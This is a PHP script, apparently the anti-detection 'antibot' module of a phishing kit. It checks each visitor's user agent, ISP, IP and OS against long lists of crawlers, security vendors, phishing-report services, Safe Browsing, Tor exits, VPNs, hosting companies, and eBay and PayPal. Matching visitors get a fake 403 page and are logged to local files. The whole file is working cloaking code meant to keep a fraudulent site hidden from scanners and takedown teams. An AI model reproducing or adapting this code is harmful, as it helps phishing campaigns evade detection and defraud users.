<?php
$ip2 = $_SERVER['REMOTE_ADDR'];
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
     "bot",
     "above",
     "google",
     "docomo",
     "mediapartners",
     "phantomjs",
     "lighthouse",
     "reverseshorturl",
     "samsung-sgh-e250",
     "softlayer",
     "amazonaws",
     "cyveillance",
     "crawler",
     "gsa-crawler",
     "phishtank",
     "dreamhost",
     "netpilot",
     "calyxinstitute",
     "tor-exit",
     "apache-httpclient",
     "lssrocketcrawler",
     "crawler",
     "urlredirectresolver",
     "jetbrains",
     "spam",
     "windows 95",
     "windows 98",
     "acunetix",
     "netsparker",
     "007ac9",
     "008",
     "Feedfetcher",
     "192.comagent",
     "200pleasebot",
     "360spider",
     "4seohuntbot",
     "50.nu",
     "a6-indexer",
     "admantx",
     "amznkassocbot",
     "aboundexbot",
     "aboutusbot",
     "abrave spider",
     "accelobot",
     "acoonbot",
     "addthis.com",
     "adsbot-google",
     "ahrefsbot",
     "alexabot",
     "amagit.com",
     "analytics",
     "antbot",
     "apercite",
     "aportworm",
     "EBAY",
     "CL0NA",
     "jabber",
     "ebay",
     "arabot",
     "hotmail!",
     "msn!",
     "baidu",
     "outlook!",
     "outlook",
     "msn",
     "duckduckbot",
     "hotmail",
     "go-http-client",
     "go-http-client/1.1",
     "trident",
     "presto",
     "virustotal",
     "unchaos",
     "dreampassport",
     "sygol",
     "nutch",
     "privoxy",
     "zipcommander",
     "neofonie",
     "abacho",
     "acoi",
     "acoon",
     "adaxas",
     "agada",
     "aladin",
     "alkaline",
     "amibot",
     "anonymizer",
     "aplix",
     "aspseek",
     "avant",
     "baboom",
     "anzwers",
     "anzwerscrawl",
     "crawlconvera",
     "del.icio.us",
     "camehttps",
     "annotate",
     "wapproxy",
     "translate",
     "feedfetcher",
     "ask24",
     "asked",
     "askaboutoil",
     "fangcrawl",
     "amzn_assoc",
     "bingpreview",
     "dr.web",
     "drweb",
     "bilbo",
     "blackwidow",
     "sogou",
     "sogou-test-spider",
     "exabot",
     "externalhit",
     "ia_archiver",
     "googletranslate",
     "translate",
     "proxy",
     "dalvik",
     "quicklook",
     "seamonkey",
     "sylera",
     "safebrowsing",
     "safesurfingwidget",
     "preview",
     "whatsapp",
     "telegram",
     "instagram",
     "zteopen",
     "icoreservice"
     
);

    foreach($blocked_words as $word2) {
        if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {
            $ip = getenv("REMOTE_ADDR");
            $file = fopen("block_bot.txt","a");
            fwrite($file," BLOCKED BY USER AGENT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
        }  
    }

$v_agent = $_SERVER['HTTP_USER_AGENT'];
if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED BY APPLEBOT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED BY APPLEBOT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'favicon') or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { 
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}


function getBrowsersss() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

$br        =   getBrowsersss();

function getOSsss() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/cros/i'            =>  'Chrome OS',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

$os        =   getOSsss();

function getisp($ip) {
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}

$ispnya = getisp($ip2);




$banned_isp = array(
    'Peak 10',
    'Quasi Networks LTD',
    'GoDaddy.com, LLC',
    'Server Plan S.r.l.',
    'Linode',
    'PIPEX-BLOCK1',
    'IPVanish',
    'Cisco Systems',
    'Tehnologii Budushego LLC',
    'Eonix Corporation',
    'hosttech GmbH',
    'Wowrack.com',
    'SunGard Availability Services LP',
    'Internap Network Services Corporation',
    'Palo Alto Networks',
    'PlusNet Technologies Ltd',
    'Scaleway',
    'Facebook',
    'Host1Plus',
    'XO Communications',
    'Nobis Technology Group',
    'ExpressVPN',
    'DME Hosting LLC',
    'Prescient Software',
    'Sungard Network Solutions',
    'OVH SAS',
    'Iomart Hosting Ltd',
    'Hosting Solution',
    'Barracuda Networks',
    'Sungard Network Solutions',
    'Solar VPS',
    'PHPNET Hosting Services',
    'DigitalOcean',
    'Level 3 Communications',
    'softlayer',
    'SoftLayer Technologies',
    'Complete Internet Access',
    'london-tor.mooo.com',
    'amazonaws',
    'cyveillance',
    'phishtank',
    'tor.piratenpartei-nrw.de',
    'cpanel66.proisp.no',
    'tor-node.com',
    'dreamhost',
    'Involta',
    'exit0.liskov.tor-relays.net',
    'tor.tocici.com',
    'netpilot',
    'calyxinstitute',
    'tor-exit',
    'msnbot',
    'p3pwgdsn',
    'netcraft',
    'University of Virginia',
    'trendmicro',
    'ebay',
    'paypal',
    'torservers',
    'comodo',
    'EGIHosting',
    'ebbs.healingpathsolutions.com',
    'healingpathsolutions.com',
    'Solution Pro',
    'Zayo Bandwidth',
    'spider.clicktargetdevelopment.com',
    'clicktargetdevelopment.com',
    'static.spro.net',
    'Digital Ocean',
    'Internap Network Services Corporation',
    'Blue Coat Systems',
    'GANDI SAS',
    'roamsite.com',
    'PIPEX-BLOCK1',
    'ColoUp',
    'Westnet',
    'The University of Tokyo',
    'University',
    'University of',
    'QuadraNet',
    'exit-01a.noisetor.net',
    'noisetor.net',
    'noisetor',
    'vultr.com',
    'Zscaler',
    'Choopa',
    'RedSwitches Pty',
    'Quintex Alliance Consulting',
    'www16.mailshell.com',
    'this.is.a.tor.exit-node.net',
    'this.is.a.tor.node.xmission.com',
    'colocrossing.com',
    'DedFiberCo',
    'crawl',
    'sucuri.net',
    'crawler',
    'proxy',
    'enom',
    'cloudflare',
    'yahoo',
    'trustwave',
    'rima-tde.net',
    'tfbnw.net',
    'pacbell.net',
    'tpnet.pl',
    'ovh.net',
    'centralnic',
    'badware',
    'phishing',
    'antivirus',
    'SiteAdvisor',
    'McAfee',
    'Bitdefender',
    'avirasoft',
    'phishtank.com',
    'googleusercontent',
    'OVH SAS',
    'Yahoo',
    'Yahoo! Inc.',
    'Google',
    'Google Inc.',
    'GoDaddy',
    'Amazon Technologies Inc.',
    'Amazon',
    'Top Level Hosting SRL',
    'Twitter',
    'Microsoft',
    'Microsoft Corporation',
    'OVH',
    'VPSmalaysia.com.my',
    'Madgenius.com',
    'Barracuda Networks Inc.',
    'Barracuda',
    'SecuredConnectivity.net',
    'Digital Domain',
    'Hetzner Online',
    'Akamai',
    'SoftLayer',
    'SURFnet',
    'Creative Thought Inc.',
    'Fastly',
    'Return Path Inc.',
    'WhatsApp',
    'Instagram',
    'Schulte Consulting LLC',
    'Universidade Federal do Rio de Janeiro',
    'Sectoor',
    'Bitfolk',
    'DIR A/S',
    'Team Technologies LLC',
    'Mainloop',
    'Junk Email Filter Inc.',
    'Art Matrix - Lightlink Inc.',
    'Redpill Linpro AS',
    'CloudFlare',
    'ESET spol. s r.o.',
    'AVAST Software s.r.o.',
    'Dosarrest',
    'Apple Inc.',
    'Symantec',
    'Mozilla',
    'Netprotect SRL',
    'Host Europe GmbH',
    'Host Sailor Ltd.',
    'PSINet Inc.',
    'Daniel James Austin',
    'RamNode',
    'Hostalia',
    'Xs4all Internet BV',
    'Inktomi Corporation',
    'Eircom Customer Assignment',
    '9New Network Inc',
    'Sony',
    'Private IP Address LAN',
    'Computer Problem Solving',
    'Fortinet',
    'Avira',
    'Rackspace',
    'Baidu',
    'Comodo',
    'Incapsula Inc',
    'Orange Polska Spolka Akcyjna',
    'Infosphere',
    'Private Customer',
    'SurfControl',
    'University of Newcastle upon Tyne',
    'Total Server Solutions',
    'LukMAN',
    'eSecureData',
    'Hosting',
    'VI Na Host Co. Ltd',
    'B2 Net Solutions',
    'Master Internet',
    'Global Perfomance',
    'Fireeye',
    'AntiVirus',
    'Security',
    'Intersoft Internet',
    'Voxility',
    'Linode',
    'Internet-Pro',
    'Trustwave Holdings Inc',
    'Online SAS',
    'Versaweb',
    'Liquid Web',
    'A100 ROW',
    'Apexis AG',
    'Apexis',
    'LogicWeb',
    'Virtual1 Limited',
    'VNET a.s.',
    'Static IP Assignment',
    'TerraTransit AG',
    'Merit Network',
    'PathsConnect',
    'Long Thrive',
    'LG DACOM',
    'Secure Internet',
    'Kaspersky',
    'UK Dedicated Servers Limited',
    'Customer Network',
    'Flokinet',
    'Simpli Networks LLC',
    'Psychz',
    'PrivateSystems Networks',
    'ScanSafe Services',
    'CachedNet',
    'CloudVPN',
    'Spark New Zealand Trading Ltd',
    'Whitelabel IT Solutions Corp',
    'Hostwinds',
    'Hosteros LLC',
    'HostUS',
    'Host',
    'ClientID',
    'Server',
    'Oracle',
    'Fortinet',
    'Unus Inc.',
    'Public facing services'
);
    foreach ($banned_isp as $isps) {
        if (substr_count($ispnya, $isps) > 0) {
            $file = fopen("block_bot.txt","a");
            fwrite($file," BLOCKED ISP || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
             $click = fopen("total_bot.txt","a");
            fwrite($click,"$ip (Detect by ISP)"."\n");
            fclose($click);
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
        }
    }


if($ip2 == "92.23.57.168" or $ip2 == "96.31.1.4") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
         $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows Server 2003/XP x64" and $br == "Firefox") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
         $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows XP" and $br == "Firefox") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows XP" and $br == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
}

if($os == "Windows XP" and $br == "Chrome") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows Vista" and $br == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Chrome OS") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "BlackBerry") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Linux") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($br == "Unknown Browser") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($br == "Internet Explorer") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Windows 2000") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}

if($os == "Unknown OS Platform") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
        fclose($click);
    //header("location: $link");exit();
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}